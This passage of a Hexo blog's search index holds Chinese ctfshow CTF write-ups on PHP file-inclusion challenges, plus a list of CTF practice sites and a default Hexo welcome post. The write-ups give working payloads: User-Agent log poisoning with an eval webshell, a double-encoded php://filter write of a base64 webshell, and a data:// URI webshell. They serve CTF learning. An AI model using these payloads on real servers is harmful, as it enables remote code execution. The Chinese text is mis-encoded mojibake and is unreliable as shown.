variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>data‰∏çËÉΩÁî®‰∫Ü„ÄÇ<br>ËøôÈáåÂèàÂ≠¶Âà∞‰∏Ä‰∏™<strong>ÂåÖÂê´Êó•ÂøóÊñá‰ª∂getshell</strong></p><blockquote><p>‰∏≠Èó¥‰ª∂ÁöÑÊó•ÂøóÊñá‰ª∂‰ºö‰øùÂ≠òÁΩëÁ´ôÁöÑËÆøÈóÆËÆ∞ÂΩï,ÊØîÂ¶Ç<strong>HTTPËØ∑Ê±ÇË°å</strong>,<strong>User-Agent</strong>,<strong>Referer</strong>Á≠âÂÆ¢Êà∑Á´Ø‰ø°ÊÅØ<br>Â¶ÇÊûúÂú®HTTPËØ∑Ê±Ç‰∏≠ÊèíÂÖ•ÊÅ∂ÊÑè‰ª£Á†Å,ÈÇ£‰πàÊÅ∂ÊÑè‰ª£Á†ÅÂ∞±‰ºö‰øùÂ≠òÂà∞Êó•ÂøóÊñá‰ª∂‰∏≠,ËÆøÈóÆÊó•ÂøóÊñá‰ª∂ÁöÑÊó∂ÂÄô,Êó•ÂøóÊñá‰ª∂‰∏≠ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÂ∞±‰ºöÊâßË°å,‰ªéËÄåÈÄ†Êàê‰ªªÊÑè‰ª£Á†ÅÊâßË°åÁîöËá≥Ëé∑Âèñshell<br>ÊØîÂ¶Ç‰ΩøÁî®‰ª£ÁêÜÂ∑•ÂÖ∑ÊäìÂåÖ,Âú®HTTPËØ∑Ê±Ç‰∏≠ÊèíÂÖ•‰∏ÄÂè•ËØùÊú®È©¨,ËÆøÈóÆÊó•ÂøóÊñá‰ª∂Êó∂‰ºöÊâßË°å‰∏ÄÂè•ËØùÊú®È©¨,ÁÑ∂Âêé‰ΩøÁî®ËöÅÂâëÁ≠âÂ∑•ÂÖ∑ÈìæÊé•,‰ªéËÄågetshell</p></blockquote><blockquote><p>nginx Â∏∏Áî®ÁöÑÈÖçÁΩÆÊñá‰ª∂Êúâ‰∏§ÁßçÔºö access.log Âíå error.log</p><p>access.log ÁöÑ‰ΩúÁî®ÊòØ ËÆ∞ÂΩïÁî®Êà∑ÊâÄÊúâÁöÑËÆøÈóÆËØ∑Ê±ÇÔºå‰∏çËÆ∫Áä∂ÊÄÅÁ†ÅÔºåÂåÖÊã¨200<br>Ôºå404,500Á≠âËØ∑Ê±ÇÔºå404,500ÁöÑËØ∑Ê±ÇÂπ∂‰∏ç‰ºöÂá∫Áé∞Âú®error.log‰∏≠„ÄÇ</p><p>error.log ÁöÑ‰ΩúÁî®ÊòØ ËÆ∞ÂΩïnginx<br>Êú¨Ë∫´ËøêË°åÊó∂ÁöÑ‰∏Ä‰∫õÈîôËØØÔºå‰∏ç‰ºöËÆ∞ÂΩïÁî®Êà∑ËÆøÈóÆÁöÑËØ∑Ê±Ç„ÄÇÊØîÂ¶ÇËÆ∞ÂΩïÊ®°ÂùóÈîôËØØ‰ø°ÊÅØÊó•ÂøóÔºå‰ª•ÂèänginxÈÖçÁΩÆÊñá‰ª∂ÁöÑÈîôËØØÊó•ÂøóÁ≠âÔºåÊ†ºÂºè‰∏çÊîØÊåÅËá™ÂÆö‰πâÔºåÂèØ‰ª•ËÆæÁΩÆÁ∫ßÂà´„ÄÇ</p></blockquote><p>ËÆøÈóÆÊó∂Ê∑ªÂä†UAÂ§¥ÈÉ®Ôºö**<? eval($_POST[0]);?>**<br>Âú®<strong>url&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>ÈáåÔºåÁÑ∂Âêé‰∏ÄÂè•ËØùÊú®È©¨ÈìæÊé•ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/fa64c532e0954f498c7d91e961397e8a.png" alt="1"></p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>ÂèÇËÄÉÊñáÁ´†Ôºö<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">Ë∞à‰∏ÄË∞àphp:&#x2F;&#x2F;filterÁöÑÂ¶ôÁî®</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 21:57:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('Â§ß‰Ω¨Âà´ÁßÄ‰∫Ü');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>php</code>,<code>data</code>,<code>;</code>,<code>.</code>,ÈÉΩË¢´ËøáÊª§‰∫ÜÔºåÂπ∂‰∏îËæìÂá∫ÁöÑÂÜÖÂÆπ‰ºöËøõË°åurlËß£Á†ÅÔºåÂõ†Ê≠§Êàë‰ª¨Ë¶ÅÂØπÂèÇÊï∞ËøõË°å2Ê¨°urlÁºñÁ†Å„ÄÇ<br>ÂèØ‰ª•‰ΩøÁî®filterÂçèËÆÆ<strong>ÂÜôÂÖ•</strong>Êñá‰ª∂<strong>a.php</strong>Âç≥<code>php://filter/write=convert.base64-decode/resource=a.php</code>‰ΩÜÊòØËøôÊÆµÂÜÖÂÆπÈúÄË¶ÅËøõË°å2Ê¨°urlÁºñÁ†Å„ÄÇ‰πüÂ∞±ÊòØ<code>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30</code></p><blockquote><p>POSTÂÜÖÂÆπËøõË°åbase-64ÁºñÁ†Å„ÄÇ<code>content=11PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</code><br>ÂÖ∂‰∏≠PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;ÊòØ‚Äù<?php eval($_POST[1]);"ÁöÑbase64ÁºñÁ†Å„ÄÇÂâçÈù¢ÁöÑ11ÊòØ‰∏∫‰∫ÜÂ°´ÂÖÖ"<?php die('Â§ß‰Ω¨Âà´ÁßÄ‰∫Ü');?>‚Äú<br>base64 4‰Ωç4‰ΩçËß£Á†ÅÔºåÂÖ∂‰∏≠‚Äù<?php die('Â§ß‰Ω¨Âà´ÁßÄ‰∫Ü');?>‚ÄúËß£Á†ÅÁöÑÂÜÖÂÆπÂÖ∂ÂÆûÂè™ÊúâphpdieÔºåÊâÄ‰ª•ÈúÄË¶ÅÂÜçÂ°´ÂÖÖ‰∏§‰Ωç„ÄÇ<br>&#x2F;&#x2F;content&#x3D;&lt;?php eval($_POST[1]);</p></blockquote><blockquote><p>Base64ÔºåÈ°æÂêçÊÄù‰πâÔºåÂ∞±ÊòØÂåÖÊã¨Â∞èÂÜôÂ≠óÊØça-z„ÄÅÂ§ßÂÜôÂ≠óÊØçA-Z„ÄÅÊï∞Â≠ó0-9„ÄÅÁ¨¶Âè∑‚Äù+‚Äù„ÄÅ‚Äù&#x2F;‚Äú‰∏ÄÂÖ±64‰∏™Â≠óÁ¨¶ÁöÑÂ≠óÁ¨¶ÈõÜ</p></blockquote><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-17 02:27:25# @email: h1xa@ctfer.com# @link: https://ctfer.com */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøáÊª§‰∫ÜphpÔºåfilterÂçèËÆÆ‰∏çËÉΩÁî®‰∫ÜÔºåinputÂçèËÆÆ‰πü‰∏çËÉΩÁî®Ôºå‰ΩÜÊòØdataÂçèËÆÆÂèØ‰ª•„ÄÇ<br><code>?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code><br><strong>PD9waHAgZXZhbCgkX1BPU1RbMV0pOwÊòØ&lt;?php eval($_POST[1]); base64ÁºñÁ†Å</strong><br><img src="https://img-blog.csdnimg.cn/fc1a66afe139471382895274c504e75d.png" alt="1"><br>ÊâßË°åÊàêÂäü„ÄÇ</p><h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>ÂèëÁé∞Ë¶Å‰∏ãËΩΩÊñá‰ª∂Ôºå‰∏ãËΩΩ‰πãÂêéÂéüÊù•ÊòØmp4Êñá‰ª∂ÔºåÊí≠ÊîæÂà∞ÂêéÈù¢ÂèëÁé∞ÊúâÈóÆÈ¢òÔºåÈ¢òÁõÆÊèêÁ§∫ËØ¥MISCÔºãÊñá‰ª∂ÂåÖÂê´„ÄÇÈÇ£ÊàëÂ∞±ÊîæÂÖ•<strong>010</strong>‰∏≠ÁúãÁúã<br><img src="https://img-blog.csdnimg.cn/b100906ba2694fbe8d53b7a163903b95.png" alt="1">ÂèëÁé∞ÊúâpngÊñá‰ª∂ÔºåÊèêÂèñÂá∫Êù•ÂèëÁé∞Ê∫êÁ†Å„ÄÇ<br><img src="https://img-blog.csdnimg.cn/8b318b0abf324bbcb4eec8e76dfd1898.png#pic_center" alt="2">Áõ¥Êé•ËØªÂèñflag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/acc29cf5ea3542709099b5f9ddbf55ce.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Âà∑È¢òÁΩëÁ´ôÂíåÂÅöÈ¢òÂ∑•ÂÖ∑</title>
      <link href="/2022/12/09/%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/"/>
      <url>/2022/12/09/%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>‰ªäÂ§©ÊàëÊé®Ëçê‰∏Ä‰∫õÂ≠¶‰π†‰ø°ÊÅØÂÆâÂÖ®ÊâÄÁî®ÁöÑÂà∑È¢òÂπ≥Âè∞Ôºö<br>1Ôºö Bugku : <a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a><br>2Ôºö CTFHub : <a href="https://www.ctfhub.com/#/index">https://www.ctfhub.com/#/index</a><br>3Ôºö NSSCTF : <a href="https://www.ctfer.vip/index">https://www.ctfer.vip/index</a><br>4Ôºö ÊîªÈò≤‰∏ñÁïå : <a href="https://adworld.xctf.org.cn/home/index">https://adworld.xctf.org.cn/home/index</a><br>5Ôºö BUUCTF : <a href="https://buuoj.cn/">https://buuoj.cn/</a><br>6Ôºö ctfshow : <a href="https://ctf.show/">https://ctf.show/</a><br>ËøòÊúâ‰∏Ä‰∏™Ê∏ÖÂçéÂ§ßÂ≠¶ÂºÄÊ∫êËΩØ‰ª∂ÈïúÂÉèÁ´ôÔºö<a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a>   ÈáåÈù¢Êúâ‰∏Ä‰∫õËôöÊãüÊú∫ÁöÑÈïúÂÉèÊñá‰ª∂Âíå‰∏Ä‰∫õÂ•ΩÁî®ÁöÑÂ∑•ÂÖ∑ÔºåÂèØ‰ª•ÂèÇËÄÉ‰∏Ä‰∏ã„ÄÇ<br>‰∏Ä‰∫õÂÅöctfÈ¢òÊó∂ÂèØËÉΩË¶ÅÁî®ÁöÑÂ∑•ÂÖ∑Ôºö<br>1Ôºö CTFÂú®Á∫øÂ∑•ÂÖ∑Ôºö<a href="http://www.hiencode.com/">http://www.hiencode.com/</a><br>2Ôºö ÈíàÂØπmd5„ÄÅsha1Á≠âÂÖ®ÁêÉÈÄöÁî®ÂÖ¨ÂºÄÁöÑÂä†ÂØÜÁÆóÊ≥ïËøõË°åÂèçÂêëÊü•ËØ¢ÔºåÈÄöËøáÁ©∑‰∏æÂ≠óÁ¨¶ÁªÑÂêàÁöÑÊñπÂºèÔºåÂàõÂª∫‰∫ÜÊòéÊñáÂØÜÊñáÂØπÂ∫îÊü•ËØ¢Êï∞ÊçÆÂ∫ìÔºåÂàõÂª∫ÁöÑËÆ∞ÂΩïÁ∫¶90‰∏á‰∫øÊù°ÔºåÂç†Áî®Á°¨ÁõòË∂ÖËøá500TBÔºåÊü•ËØ¢ÊàêÂäüÁéá95%‰ª•‰∏äÔºåÂæàÂ§öÂ§çÊùÇÂØÜÊñáÂè™ÊúâÊú¨Á´ôÊâçÂèØÊü•ËØ¢„ÄÇËá™2006Âπ¥Â∑≤Á®≥ÂÆöËøêË°åÂçÅ‰ΩôÂπ¥ÔºåÂõΩÂÜÖÂ§ñ‰∫´ÊúâÁõõË™â„ÄÇ Ôºö<a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br>3Ôºö ÈáåÈù¢ÊúâÂêÑÁßçÂ∑•ÂÖ∑   <a href="http://www.wetools.com/">ÂæÆÂ∑•ÂÖ∑</a></p><p>4Ôºö <a href="https://phpinfo.me/domain">Âú®Á∫øÂ≠êÂüüÂêçÊü•ËØ¢Â∑•ÂÖ∑</a></p><p>‰ªäÂ§©Â∞±Âà∞ËøôÔºå‰ª•ÂêéÊàë‰ºöÂàÜ‰∫´Êõ¥Â§öÊúâÁî®ÁöÑ‰∏úË•ø„ÄÇÊï¨ËØ∑ÊúüÂæÖ‚Ä¶‚Ä¶</p>]]></content>
      
      
      <categories>
          
          <category> Â∞èÂ∑•ÂÖ∑ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÁΩëÁ´ô </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/12/07/hello-world/"/>
      <url>/2022/12/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
